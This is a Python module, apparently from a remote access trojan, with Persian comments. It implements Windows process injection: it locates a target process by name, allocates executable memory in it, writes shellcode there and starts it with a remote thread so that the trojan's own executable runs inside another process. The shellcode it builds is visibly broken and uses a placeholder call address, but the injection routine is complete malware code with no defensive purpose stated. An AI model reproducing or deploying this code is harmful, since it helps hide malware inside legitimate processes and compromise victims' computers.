import struct
import logging
from rat_config import Config
import psutil
import os
import sys

try:
    import win32api
    import win32con
    import win32process
    import win32security
    import win32file
    WIN32_AVAILABLE = True
except ImportError as e:
    WIN32_AVAILABLE = False
    logging.warning(f"Win32 modules not available: {e}")

class ProcessInjector:
    def __init__(self):
        if not Config.ENABLE_PROCESS_INJECTION:
            logging.info("Process injection disabled in config")
            return
            
        if Config.DEBUG_MODE:
            logging.info("ProcessInjector initialized")
            if not WIN32_AVAILABLE:
                logging.warning("Win32 modules not available - process injection will be disabled")

    def find_target_process(self, target_name=None):
        """
        پیدا کردن فرآیند هدف برای تزریق.
        """
        if not Config.ENABLE_PROCESS_INJECTION:
            logging.info("Process injection disabled - skipping target search")
            return None

        try:
            # استفاده از target process از config یا مقدار پیش‌فرض
            target = target_name or Config.INJECTION_TARGET_PROCESS
            
            for proc in psutil.process_iter(['name', 'pid', 'username']):
                if proc.info['name'].lower() == target.lower():
                    if Config.DEBUG_MODE:
                        logging.info(f"Found target process: {target}, PID: {proc.info['pid']}")
                    return proc.info['pid']
            
            if Config.DEBUG_MODE:
                logging.warning(f"Target process {target} not found")
            return None
            
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error finding target process: {str(e)}")
            return None

    def inject_code(self, pid, shellcode):
        """
        تزریق شل‌کد به فرآیند هدف.
        """
        if not Config.ENABLE_PROCESS_INJECTION:
            logging.info("Process injection disabled - skipping injection")
            return False
            
        if not WIN32_AVAILABLE:
            logging.error("Win32 modules not available - injection disabled")
            return False
            
        try:
            # باز کردن فرآیند با دسترسی‌های لازم
            process_handle = win32api.OpenProcess(
                win32con.PROCESS_ALL_ACCESS, False, pid
            )
            if not process_handle:
                if Config.DEBUG_MODE:
                    logging.error(f"Failed to open process PID: {pid}")
                return False

            # تخصیص حافظه در فرآیند هدف
            mem_address = win32process.VirtualAllocEx(
                process_handle, None, len(shellcode),
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_EXECUTE_READWRITE
            )
            if not mem_address:
                if Config.DEBUG_MODE:
                    logging.error("Failed to allocate memory in target process")
                win32api.CloseHandle(process_handle)
                return False

            # نوشتن شل‌کد در حافظه
            written = win32process.WriteProcessMemory(
                process_handle, mem_address, shellcode, len(shellcode), None
            )
            if not written:
                if Config.DEBUG_MODE:
                    logging.error("Failed to write shellcode to target process")
                win32process.VirtualFreeEx(process_handle, mem_address, 0, win32con.MEM_RELEASE)
                win32api.CloseHandle(process_handle)
                return False

            # ایجاد ترد ریموت برای اجرای شل‌کد
            thread_handle = win32process.CreateRemoteThread(
                process_handle, None, 0, mem_address, None, 0, None
            )
            if not thread_handle:
                if Config.DEBUG_MODE:
                    logging.error("Failed to create remote thread")
                win32process.VirtualFreeEx(process_handle, mem_address, 0, win32con.MEM_RELEASE)
                win32api.CloseHandle(process_handle)
                return False

            # بستن هندل‌ها
            win32api.CloseHandle(thread_handle)
            win32api.CloseHandle(process_handle)
            
            if Config.DEBUG_MODE:
                logging.info(f"Successfully injected code into PID: {pid}")
            return True

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Injection error: {str(e)}")
            return False

    def prepare_shellcode(self):
        """
        آماده‌سازی شل‌کد برای اجرای کلاینت.
        """
        if not Config.ENABLE_PROCESS_INJECTION:
            logging.info("Process injection disabled - skipping shellcode preparation")
            return None

        try:
            # مسیر فایل اجرایی فعلی
            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            
            # شل‌کد ساده برای اجرای فایل
            # توجه: این یک نمونه ساده است و در محیط واقعی نیاز به شل‌کد مناسب دارید
            shellcode = (
                b"\x31\xc0"  # xor eax, eax
                b"\x50"      # push eax
                b"\x68" + exe_path.encode('utf-16le') + b"\x00\x00"  # push path
                b"\x68\x6c\x6c\x00\x00"  # push "ll"
                b"\x68\x65\x72\x6e\x65"  # push "erne"
                b"\x68\x6b\x65\x72\x6e"  # push "kern"
                b"\x54"      # push esp
                b"\xb8\x7c\x00\x00\x00"  # mov eax, 0x7c (placeholder for CreateProcess)
                b"\xff\xd0"  # call eax
            )
            
            if Config.DEBUG_MODE:
                logging.info(f"Prepared shellcode for: {exe_path}")
                
            return shellcode
            
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error preparing shellcode: {str(e)}")
            return None

    def attempt_injection(self, target_process=None):
        """
        تلاش برای تزریق به فرآیند هدف.
        """
        if not Config.ENABLE_PROCESS_INJECTION:
            logging.info("Process injection disabled - skipping injection attempt")
            return False

        try:
            # پیدا کردن فرآیند هدف
            pid = self.find_target_process(target_process)
            if not pid:
                logging.warning("No suitable target process found for injection")
                return False

            # آماده‌سازی شل‌کد
            shellcode = self.prepare_shellcode()
            if not shellcode:
                logging.error("Failed to prepare shellcode")
                return False

            # انجام تزریق
            success = self.inject_code(pid, shellcode)
            if success:
                logging.info(f"Successfully injected into process {pid}")
            else:
                logging.warning(f"Failed to inject into process {pid}")
                
            return success

        except Exception as e:
            logging.error(f"Injection attempt failed: {str(e)}")
            return False

    def get_injection_status(self):
        """
        دریافت وضعیت قابلیت تزریق.
        """
        status = {
            "enabled": Config.ENABLE_PROCESS_INJECTION,
            "win32_available": WIN32_AVAILABLE,
            "target_process": Config.INJECTION_TARGET_PROCESS,
            "injection_method": Config.INJECTION_METHOD
        }
        
        if Config.ENABLE_PROCESS_INJECTION and WIN32_AVAILABLE:
            # بررسی وجود فرآیند هدف
            target_pid = self.find_target_process()
            status["target_found"] = target_pid is not None
            status["target_pid"] = target_pid
            
        return status